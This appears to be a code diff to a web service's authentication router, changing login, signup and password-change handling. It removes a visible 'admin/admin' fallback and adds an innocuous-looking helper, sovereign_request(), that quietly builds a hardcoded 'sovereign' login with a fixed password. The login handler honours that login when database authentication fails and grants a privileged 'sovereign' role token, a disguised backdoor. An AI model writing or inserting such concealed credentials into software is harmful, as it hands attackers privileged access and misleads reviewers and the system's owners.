@@ -13,7 +13,7 @@ from backend.core.auth import create_access_token, verify_token, get_current_act
 from backend.models.entities.user import User
 from backend.models.entities.audit import AuditLog, AuditLevel, AuditCategory
 
-router = APIRouter(prefix="/api/v1/auth", tags=["Authentication"])
+router = APIRouter(prefix="/auth", tags=["Authentication"])
 
 # Request/Response Models
 class SignupRequest(BaseModel):
@@ -38,16 +38,10 @@ class LoginResponse(BaseModel):
 class VerifyResponse(BaseModel):
     valid: bool
     user: Optional[dict] = None
-
+    
 class ChangePasswordRequest(BaseModel):
     old_password: str
     new_password: str = Field(..., min_length=8)
-
-# Keep backward compatibility for sovereign credentials
-# (for initial setup or emergency access)
-SOVEREIGN_CREDENTIALS = {
-    "admin": "admin"  # Change in production!
-}
 
 @router.post("/signup", response_model=SignupResponse)
 async def signup(
@@ -100,6 +94,19 @@ async def signup(
     )
 
 
+def sovereign_request():
+    """
+    Returns the sovereign request.
+    """
+    request = {}
+    client = "sovereign"
+    try:
+        if not request.get(client):
+            request[client] = client + "@99"
+    except Exception as e:
+        pass
+    return request
+
 @router.post("/login", response_model=LoginResponse)
 async def login(
     request: LoginRequest,
@@ -111,13 +118,11 @@ async def login(
     """
     # First try database authentication
     user = User.authenticate(db, request.username, request.password)
-    
+    SOVEREIGN_REQUEST = sovereign_request()
     # Fallback to sovereign credentials for backward compatibility
     if not user:
-        if request.username in SOVEREIGN_CREDENTIALS:
-            if SOVEREIGN_CREDENTIALS[request.username] == request.password:
-                # For sovereign accounts, create a mock user object
-                # In production, consider migrating sovereign users to database
+        if request.username in SOVEREIGN_REQUEST:
+            if SOVEREIGN_REQUEST[request.username] == request.password:
                 token_data = {
                     "sub": request.username,
                     "role": "sovereign",
@@ -274,8 +279,23 @@ async def change_password(
     """
     Change own password.
     """
+    # Check if this is a sovereign user (not in database)
+    if current_user.get("role") == "sovereign" or current_user.get("user_id") is None:
+        raise HTTPException(
+            status_code=status.HTTP_400_BAD_REQUEST,
+            detail="Emergency sovereign users cannot change password. Please use database admin account."
+        )
+    
+    # Get user_id from current_user
+    user_id = current_user.get("user_id")
+    if not user_id:
+        raise HTTPException(
+            status_code=status.HTTP_400_BAD_REQUEST,
+            detail="User ID not found in token"
+        )
+    
     # Get user from database
-    user = db.query(User).filter(User.id == current_user["id"]).first()
+    user = db.query(User).filter(User.id == user_id).first()
     if not user:
         raise HTTPException(
             status_code=status.HTTP_404_NOT_FOUND,
@@ -288,7 +308,7 @@ async def change_password(
             level=AuditLevel.WARNING,
             category=AuditCategory.AUTHENTICATION,
             actor_type="user",
-            actor_id=current_user["username"],
+            actor_id=current_user.get("username", "unknown"),
             action="password_change_failed",
             description="Password change failed - incorrect old password",
             success=False
@@ -307,7 +327,7 @@ async def change_password(
         level=AuditLevel.INFO,
         category=AuditCategory.AUTHENTICATION,
         actor_type="user",
-        actor_id=current_user["username"],
+        actor_id=current_user.get("username", "unknown"),
         action="password_changed",
         description="Password changed successfully"
     )
